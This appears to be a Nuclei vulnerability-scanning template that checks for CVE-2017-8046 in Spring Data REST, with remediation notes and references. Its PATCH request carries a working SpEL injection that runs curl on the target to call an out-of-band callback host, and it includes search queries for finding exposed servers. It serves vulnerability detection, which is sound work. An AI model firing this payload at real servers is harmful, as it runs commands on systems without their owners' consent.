flow: 'http(1)

  set("endpoint", iterate(template.endpoint)[0])

  http(2)

  '
http:
- extractors:
  - group: 1
    internal: true
    name: endpoint
    part: body
    regex:
    - '"href"\s*:\s*"([^"]+)\{\?page,size,sort\}"'
    type: regex
  matchers:
  - condition: or
    internal: true
    part: header
    type: word
    words:
    - application/json
    - application/hal+json
    - application/vnd.spring-boot.actuator
  - condition: or
    internal: true
    part: body
    type: word
    words:
    - '"_embedded"'
    - '"_links"'
    - '"page"'
    - '"size"'
  matchers-condition: and
  max-redirects: 3
  method: GET
  path:
  - '{{BaseURL}}'
  redirects: true
- body: "[\n  {\n    \"op\": \"replace\",\n    \"path\": \"T(java.lang.Runtime).getRuntime().exec(\\\
    \"curl {{interactsh-url}}\\\").x\",\n    \"value\": \"CVE-2017-8046\"\n  }\n]\n"
  headers:
    Content-Type: application/json-patch+json
  matchers:
  - part: interactsh_protocol
    type: word
    words:
    - dns
  - part: body
    type: word
    words:
    - org.springframework
  matchers-condition: and
  method: PATCH
  path:
  - '{{endpoint}}/1'
id: CVE-2017-8046
info:
  author: domwhewell-sage
  classification:
    cpe: cpe:2.3:a:vmware:spring_boot:*:*:*:*:*:*:*:*
    cve-id: CVE-2017-8046
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-20
    epss-percentile: 0.99878
    epss-score: 0.93978
  description: 'Spring Data REST < 2.6.9 and 3.0.1, Spring Boot < 1.5.9 and 2.0 M6
    contain a remote code execution caused by processing malicious PATCH requests
    with crafted JSON data, letting attackers execute arbitrary Java code, exploit
    requires sending malicious PATCH requests.

    '
  impact: 'Malicious PATCH requests submitted to servers using Spring Data REST versions
    prior to 2.6.9 (Ingalls SR9), versions prior to 3.0.1 (Kay SR1) and Spring Boot
    versions prior to 1.5.9, 2.0 M6 can use specially crafted JSON data to run arbitrary
    Java code.

    '
  metadata:
    fofa-query: title="eureka"
    google-query: intitle:"eureka"
    product: spring_boot
    shodan-query: http.title:"eureka"
    vendor: vmware
  name: Spring Data REST < 2.6.9 (Ingalls SR9) / 3.0.1 (Kay SR1) - PATCH Request Remote
    Code Execution
  reference:
  - https://nvd.nist.gov/vuln/detail/CVE-2017-8046
  - https://spring.io/security/cve-2017-8046
  - https://access.redhat.com/errata/RHSA-2018:2405
  - https://www.exploit-db.com/exploits/44289/
  - https://github.com/jkutner/spring-break-cve-2017-8046
  remediation: 'To remediate this vulnerability, update to Spring Data REST version
    2.6.9 or later, or 3.0.1 or later, and Spring Boot version 1.5.9 or later, or
    2.0 M6 or later.

    '
  severity: critical
  tags: cve,cve2017,pivotal,springboot,pivotal_software,vkev,vuln
